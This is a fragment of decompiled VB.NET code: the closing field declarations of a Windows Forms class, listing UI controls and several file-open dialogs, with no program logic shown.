		Private _PictureBox2 As PictureBox

		' Token: 0x040001C8 RID: 456
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x040001C9 RID: 457
		<AccessedThroughProperty("PictureBox3")>
		Private _PictureBox3 As PictureBox

		' Token: 0x040001CA RID: 458
		<AccessedThroughProperty("GroupBox4")>
		Private _GroupBox4 As GroupBox

		' Token: 0x040001CB RID: 459
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x040001CC RID: 460
		<AccessedThroughProperty("Button3")>
		Private _Button3 As Button

		' Token: 0x040001CD RID: 461
		<AccessedThroughProperty("Button4")>
		Private _Button4 As Button

		' Token: 0x040001CE RID: 462
		<AccessedThroughProperty("Button5")>
		Private _Button5 As Button

		' Token: 0x040001CF RID: 463
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x040001D0 RID: 464
		<AccessedThroughProperty("TextBox4")>
		Private _TextBox4 As TextBox

		' Token: 0x040001D1 RID: 465
		<AccessedThroughProperty("GroupBox5")>
		Private _GroupBox5 As GroupBox

		' Token: 0x040001D2 RID: 466
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x040001D3 RID: 467
		<AccessedThroughProperty("Button6")>
		Private _Button6 As Button

		' Token: 0x040001D4 RID: 468
		<AccessedThroughProperty("Button8")>
		Private _Button8 As Button

		' Token: 0x040001D5 RID: 469
		<AccessedThroughProperty("TextBox6")>
		Private _TextBox6 As TextBox

		' Token: 0x040001D6 RID: 470
		<AccessedThroughProperty("GroupBox6")>
		Private _GroupBox6 As GroupBox

		' Token: 0x040001D7 RID: 471
		<AccessedThroughProperty("Label5")>
		Private _Label5 As Label

		' Token: 0x040001D8 RID: 472
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x040001D9 RID: 473
		<AccessedThroughProperty("Button7")>
		Private _Button7 As Button

		' Token: 0x040001DA RID: 474
		<AccessedThroughProperty("TextBox5")>
		Private _TextBox5 As TextBox

		' Token: 0x040001DB RID: 475
		<AccessedThroughProperty("Button9")>
		Private _Button9 As Button

		' Token: 0x040001DC RID: 476
		<AccessedThroughProperty("Label6")>
		Private _Label6 As Label

		' Token: 0x040001DD RID: 477
		Private ico As OpenFileDialog

		' Token: 0x040001DE RID: 478
		Private exe As OpenFileDialog

		' Token: 0x040001DF RID: 479
		Private cc As OpenFileDialog

		' Token: 0x040001E0 RID: 480
		Private OpenFileDialog As OpenFileDialog
	End Class
End Namespace
